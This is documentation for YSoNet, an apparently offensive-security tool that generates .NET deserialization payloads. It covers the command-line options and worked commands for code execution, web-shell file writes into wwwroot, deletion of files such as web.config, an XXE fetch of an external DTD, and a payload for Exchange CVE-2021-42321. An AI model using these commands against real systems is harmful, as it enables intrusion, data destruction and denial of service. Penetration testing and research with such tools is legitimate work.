# Usage and Examples

Command-line reference for YSoNet, plus worked examples. For the gadget and plugin catalog, see [Gadgets and Plugins](gadgets-and-plugins.md).

Back to [documentation index](README.md).

## Command line

Use `ysonet.exe --fullhelp` to see the full details. You can also see a specific gadget's or plugin's help:

- `ysonet.exe -g NameHere -help`
- `ysonet.exe -p NameHere -help`

```text
Usage: ysonet.exe [options]
Options:
  -p, --plugin=VALUE         The plugin to be used.
  -o, --output=VALUE         The output format (raw|base64|raw-
                               urlencode|base64-urlencode|hex).
  -g, --gadget=VALUE         The gadget chain.
  -f, --formatter=VALUE      The formatter.
  -c, --command=VALUE        The command to be executed.
      --rawcmd               Command will be executed as is without `cmd /c `
                               being appended (anything after first space is an
                               argument).
  -s, --stdin                The command to be executed will be read from
                               standard input.
      --bgc, --bridgedgadgetchains=VALUE
                             Chain of bridged gadgets separated by comma (,).
                               Each gadget will be used to complete the next
                               bridge gadget. The last one will be used in the
                               requested gadget. This will be ignored when
                               using the searchformatter argument.
  -t, --test                 Whether to run payload locally. Default: false
      --outputpath=VALUE     The output file path. It will be ignored if
                               empty.
      --minify               Whether to minify the payloads where applicable.
                               Default: false
      --ust, --usesimpletype This is to remove additional info only when
                               minifying and FormatterAssemblyStyle=Simple
                               (always `true` with `--minify` for binary
                               formatters). Default: true
      --raf, --runallformatters
                             Whether to run all the gadgets with the provided
                               formatter (ignores gadget name, output format,
                               and the test flag arguments). This will search
                               in formatters and also show the displayed
                               payload length. Default: false
      --sf, --searchformatter=VALUE
                             Search in all formatters to show relevant
                               gadgets and their formatters (other parameters
                               will be ignored).
      --list=VALUE           Print a machine-readable list (one item per line)
                               and exit. Categories:
                               gadgets|plugins|formatters|options|outputs. Add
                               -g <gadget> to list that gadget's
                               formatters/options, or -p <plugin> to list that
                               plugin's options. Useful for shell tab-completion
                               scripts.
      --category=VALUE       Find gadgets by category (repeatable):
                               --category=axis=value where axis is
                               kind|formatter|input|requirement|version. Repeat
                               for OR within an axis and AND across axes. A
                               version is an exact runtime build (4.8.1, 5.0,
                               mono) and only lists gadgets recorded as working
                               there. Alone it prints matching gadgets and their
                               categories; with '--list gadgets' it prints
                               matching names only. Example:
                               --category=kind=code-execution
                               --category=formatter=Json.NET
      --debugmode            Enable debugging to show exception errors and
                               output length
  -h, --help                 Shows this message and exit.
      --fullhelp             Shows this message + extra options for gadgets
                               and plugins and exit.
      --credit               Shows the credit/history of gadgets and plugins
                               (other parameters will be ignored).
      --checkupdate          Check GitHub for a newer YSoNet release and exit.
      --runmytest            Runs that `Start` method of `TestingArenaHome` -
                               useful for testing and debugging.
```

Note: Machine authentication code (MAC) key modifier is not used for LosFormatter in YSoNet. Therefore, LosFormatter (base64 encoded) can be used to create ObjectStateFormatter payloads.

## Find a gadget by category

Every gadget declares discovery metadata: its payload `kind`, the `formatter` (serializer) it supports, the `input` it accepts, its target `requirement`, and the runtime `version` its effect is recorded on. Use `--category=axis=value` to find gadgets by these facets. This is discovery only; it does not build a payload.

- Axes: `kind`, `formatter`, `input`, `requirement`, `version`.
- Repeat the same axis for OR; use different axes for AND. One gadget (or one of its variants) must match the whole query.

```bash
# Show all code-execution gadgets that support Json.NET, with their categories
./ysonet.exe --category=kind=code-execution --category=formatter=Json.NET

# Print only the matching gadget names (for scripts), by adding --list gadgets
./ysonet.exe --list gadgets --category=kind=network

# Gadgets recorded as working on a given runtime build
./ysonet.exe --category=version=4.8.1
./ysonet.exe --category=version=5.0
```

### The version axis

The other axes use broad words. This one uses exact build numbers, because "old
build" does not tell you whether a payload lands on the target in front of you.
Write it the way you say it: `4.8.1`, `.NET 4.8`, `net5.0`, `mono`, or the
canonical `net-fx-4.8.1`.

Read a listed version as "reproduced or documented here", never as "fails
everywhere else". A version that is not listed only means nobody recorded it.
Most gadgets are still `unspecified`, and where the real gate is not a runtime
version at all (an OS patch, a library version, a config switch) the gadget stays
`unspecified` and says so in its own help text. Use `--category=version=unspecified`
to list what has not been pinned down yet.

Interactive mode has the same filter. Inside the "Build a gadget payload" flow, pick `[ Filter by category... ]` (or press `Ctrl+F` in the live columns) to open a checklist over the five axes with live match counts, then narrow the gadget list to what matches.

## Denial-of-service gadgets

A few gadgets do not run code: they disrupt or terminate the target process. They are
their own category (`kind=denial-of-service`) and YSoNet will not build one by accident.

```bash
# Find them
./ysonet.exe --category=kind=denial-of-service

# Without the acknowledgement, the run is refused
./ysonet.exe -g <DosGadget> -f Json.NET -c x
Refused: <DosGadget> is a denial-of-service gadget. Re-run with --i-understand-dos.

# With it, the payload is built and a warning is printed to stderr first
./ysonet.exe -g <DosGadget> -f Json.NET -c x --i-understand-dos
WARNING: <DosGadget> is a denial-of-service payload.
It can disrupt or terminate the target process.
Use it only against systems you are authorized to test.
```

The warning goes to stderr, so the payload on stdout stays clean and pipeable.
These gadgets are also left out of every "generate everything" run (`--raf` and the
interactive run-all), which say how many were skipped:

```bash
./ysonet.exe --raf -f Json.NET -c calc.exe
Skipped 1 denial-of-service gadget. Run it by name with --i-understand-dos.
```

The same flag works for a gadget named in a `--bgc` chain, and for the plugins that
let you pick an inner gadget (`ViewState`, `Resx`, `SharePoint`).

## Tips

When specifying complex commands, it can be tedious to escape some special characters (`;`, `|`, `&`, ..). Use the stdin option (`-s`) to read the command from stdin:

```bash
cat my_long_cmd.txt | ysonet.exe -o raw -g WindowsIdentity -f Json.Net -s
```

XmlSerializer and DataContractSerializer formatters generate a wrapper XML format including the expected type in the `type` attribute of the root node, as used, for example, in DotNetNuke. You may need to modify the generated XML based on how XmlSerializer gets the expected type in your case.

## Examples

### Generate a calc.exe payload for Json.Net using the ObjectDataProvider gadget

```bash
./ysonet.exe -f Json.Net -g ObjectDataProvider -o raw -c "calc" -t
```

### Generate a calc.exe payload for BinaryFormatter using the PSObject gadget

```bash
./ysonet.exe -f BinaryFormatter -g PSObject -o base64 -c "calc" -t
```

### Generate a run_command payload for DotNetNuke using its plugin

```bash
./ysonet.exe -p DotNetNuke -m run_command -c calc.exe
```

### Generate a read_file payload for DotNetNuke using its plugin

```bash
./ysonet.exe -p DotNetNuke -m read_file -f win.ini
```

### Write, copy, move or truncate a file on the target without starting a process

`TypeConfuseDelegateFileOperations` puts a two-string file method in the
TypeConfuseDelegate splice, so the deserializer itself does the file operation.
`--variant` picks the operation and decides what `-c` means, and `--rootcontainer`
picks the serialized root (1 SortedSet, 2 SortedDictionary, 3 TreeSet), exactly as
for the other TypeConfuseDelegate payloads.

```bash
# 1 write: drop the TEXT of a local file onto a target path
./ysonet.exe -g TypeConfuseDelegateFileOperations -f BinaryFormatter --variant 1 -c "C:\inetpub\wwwroot\a.aspx;payload.aspx"

# 2 copy / 3 move a file, 4 move a directory: both paths are on the TARGET
./ysonet.exe -g TypeConfuseDelegateFileOperations -f BinaryFormatter --variant 2 -c "C:\work\z-source.txt;C:\work\a-destination.txt"

# 5 empty: create the file, or truncate it if it exists
./ysonet.exe -g TypeConfuseDelegateFileOperations -f BinaryFormatter --variant 5 -c "C:\work\empty.txt"
```

Two things to know:

- Only the FIRST `;` splits the value, so a destination path or embedded text may
  contain more of them. Quote the whole `-c` value in a shell.
- The sorted container hands its LARGER element to the operation first, so the
  first argument must sort strictly after the second using `String.CompareOrdinal`
  (the target path above the embedded text; the source path above the
  destination). ysonet refuses any other input instead of quietly swapping or
  rewriting what you typed. The second example is named so the source sorts
  higher; the first one only passes if the text in `payload.aspx` starts below
  the target path.

For variant 1 only, the second field is a file on YOUR machine. Its text is read
and embedded when the payload is built, so it does not need to exist on the
target. The transfer preserves characters, not bytes: a BOM is consumed on read
and `File.WriteAllText` writes UTF-8 without one.

One note on `--minify`: the XML minifier rewrites whitespace inside text content,
which would change the file the target ends up with. ysonet checks the minified
NetDataContractSerializer payload and refuses it when either string was rewritten
(trailing whitespace, a carriage return, and `"; "` are what get changed), instead
of shipping a payload that quietly delivers something else. BinaryFormatter and
LosFormatter carry the strings unchanged, so `--minify` works with them for any
input.

### Delete files on the target when the object is disposed or collected

`TempFileCollection` uses `System.CodeDom.Compiler.TempFileCollection`, whose
cleanup path calls `File.Delete` on every path it was given. `-c` is the first
path, and `--extrafile` adds more - repeat it once per extra path.

```bash
# one file
./ysonet.exe -g TempFileCollection -f BinaryFormatter -c "C:\inetpub\wwwroot\web.config"

# several files, one --extrafile each
./ysonet.exe -g TempFileCollection -f BinaryFormatter -c "C:\app\a.log" --extrafile "C:\app\b.log" --extrafile "C:\app\c.log"

# a UNC path works too, because File.Delete accepts one
./ysonet.exe -g TempFileCollection -f SoapFormatter -c "\\fileserver\share\report.xlsx"
```

Four things to know:

- THE TIMING IS THE TARGET'S, NOT YOURS. The deletion runs from
  `IDisposable.Dispose()`, which is deterministic but needs the target to dispose
  the object, or from the finalizer, which needs the object to become unreachable
  AND a garbage collection to run its finalizer queue. It can happen at once,
  much later, or never if the process exits first.
- Nothing reports back. The framework wraps each `File.Delete` in its own empty
  `catch`, so a missing file, a locked file and a permission error all look the
  same: silence.
- Every path is a path on the TARGET. It is not opened, resolved or checked on
  your machine, so a relative path resolves against the deserializing process's
  working directory. Paths that differ only by case are collapsed into one entry.
- `-t` is refused. A self-test would deserialize the payload here, which builds a
  real `TempFileCollection` holding YOUR paths and lets its finalizer delete your
  own files. Generate without `-t`.

The same path-fidelity rule as above applies, and a little more strictly: because
this gadget deletes what it names, ysonet checks every payload it produces and
refuses one where a path was rewritten. `--minify` on an XML formatter is one
cause; the other is the DataContractSerializer writer, which loses a carriage
return even without `--minify`. BinaryFormatter and LosFormatter carry any path
unchanged.

### Make the target fetch an external DTD (legacy XXE)

`DataViewManagerXxe` sets `System.Data.DataViewManager.DataViewSettingCollectionString`.
That setter parses the value with a legacy `XmlTextReader`, so a DOCTYPE with an
external parameter entity makes the target fetch a URL you choose. `-c` is that
URL.

```bash
# the five formatters that can reach the setter
./ysonet.exe -g DataViewManagerXxe -f Xaml -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataViewManagerXxe -f JavaScriptSerializer -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataViewManagerXxe -f FastJson -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataViewManagerXxe -f SharpSerializerXml -c "http://10.0.0.5:8080/x.dtd"
./ysonet.exe -g DataViewManagerXxe -f SharpSerializerBinary -c "http://10.0.0.5:8080/x.dtd"
```

Four things to know:

- IT ONLY FIRES ON A TARGET WITH THE OLD XML DEFAULTS. Since .NET Framework
  4.5.2 a legacy `XmlTextReader` is built with no resolver, so nothing is
  fetched. It still fires when the deserializing application TARGETS an earlier
  framework (its `TargetFrameworkAttribute`, not the installed runtime), or when
  the machine sets `EnableLegacyXmlSettings` to 1 under
  `HKLM\SOFTWARE\Microsoft\.NETFramework\XML` or the same key in `HKCU`. Put
  another way: a modern runtime is not a defence on its own, but a modern target
  framework is.
- This is a network effect, not file disclosure. A fetched DTD proves SSRF and
  outbound reachability. The setter reads elements and attributes only, never
  entity text, and returns nothing to you, so it is not a way to read a file off
  the target.
- Only five formatters can carry it, and that is structural rather than
  unfinished work. `DataViewManager` implements `IList`, so a serializer that
  infers a contract (Json.NET, YamlDotNet, DataContractSerializer,
  NetDataContractSerializer, XmlSerializer, DataContractJsonSerializer,
  MessagePack typeless) treats it as a COLLECTION and never calls the property
  setter. BinaryFormatter, SoapFormatter, LosFormatter and FsPickler restore
  fields without calling any setter, and the type is not `[Serializable]` anyway.
- The URL must be http or https and must not contain a double quote, `<`, `>`,
  a backslash, whitespace or a control character, because it is placed inside a
  quoted DTD external identifier. Percent-encode anything else. Query strings
  are fine: `&` and `%` are literal there.

### Generate a minified BinaryFormatter payload for Exchange CVE-2021-42321

Uses the ActivitySurrogateDisableTypeCheck gadget inside the ClaimsPrincipal gadget.

```bash
./ysonet.exe -g ClaimsPrincipal -f BinaryFormatter -c foobar -bgc ActivitySurrogateDisableTypeCheck --minify --ust
```
